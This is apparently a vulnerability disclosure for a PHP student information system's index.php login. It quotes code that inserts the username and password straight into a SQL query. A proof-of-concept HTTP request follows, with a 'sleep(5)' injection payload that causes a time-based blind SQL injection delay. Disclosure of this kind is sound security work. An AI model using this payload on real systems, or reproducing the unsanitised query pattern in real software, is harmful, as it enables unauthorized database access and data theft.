# student-information-system-in-php has time-based blind SQL injection vulnerability in index.php

## supplier 
[https://code-projects.org/task-manager-in-php-with-source-code/](https://code-projects.org/student-information-system-in-php-with-source-code-2/)
## Vulnerability file
index.php

## describe
In index.php, from line 8

```

  if(isset($_POST['login'])) {

    $uname = clean($_POST['username']);
    $pword = clean($_POST['password']);

    $query = "SELECT * FROM students WHERE username = '$uname' AND password = '$pword'";

    echo $query;

    $result = mysqli_query($con, $query);

    if(mysqli_num_rows($result) > 0) {

      $row = mysqli_fetch_assoc($result);

      $_SESSION['userid'] = $row['id'];
      $_SESSION['username'] = $row['username'];
      $_SESSION['password'] = $row['password'];

      header("location:profile.php");
      exit;

    } else {

      $_SESSION['errprompt'] = "Wrong username or password.";

    }

  }
 
```
Inserting $_POST['username'] and $_POST['password'] into Mysql without any filter. A time-based blind SQL injection can be triggered.




## POC

```
POST /index.php HTTP/1.1
Host: 127.0.0.1:8082
sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

login=1&username=4'%20or%20sleep(5)#&password=1
```

Send this request, you can see a 5 sec time delay triggered by the time-based injection
